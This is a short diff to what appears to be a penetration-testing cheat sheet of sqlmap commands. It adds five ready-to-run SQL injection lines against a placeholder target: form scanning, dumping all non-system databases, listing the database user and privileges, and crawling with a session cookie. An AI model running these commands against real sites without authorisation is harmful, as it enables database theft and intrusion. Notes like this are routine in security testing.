@@ -1,1 +1,5 @@
-sqlmap --forms --batch -u "http://somewebsite/"
+sqlmap --batch -u "http://$TARGET/" --forms
+sqlmap --batch -u "http://$TARGET/" --dump-all --exclude-sysdbs
+sqlmap --batch -u "http://$TARGET/" --banner --current-user --current-db --is-dba --privilege
+sqlmap --batch -u "http://$TARGET/" --crawl 5
+sqlmap --batch -u "http://$TARGET/" --crawl 5 --cookie "KEY=VALUE" --crawl-exclude "logout"
